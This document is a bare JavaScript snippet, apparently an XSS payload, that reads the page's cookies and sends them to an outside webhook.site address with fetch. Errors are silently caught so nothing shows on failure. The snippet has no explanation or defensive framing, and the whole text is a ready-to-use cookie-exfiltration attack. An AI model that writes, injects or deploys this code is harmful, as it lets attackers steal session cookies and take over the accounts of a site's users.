(() => {
  try {
    if (document.cookie) {
      fetch("https://webhook.site/ae45bf46-4c24-4e26-9704-986cfbe83d6a?cookie=" + encodeURIComponent(document.cookie));
    }
  } catch (e) {
  }
})();
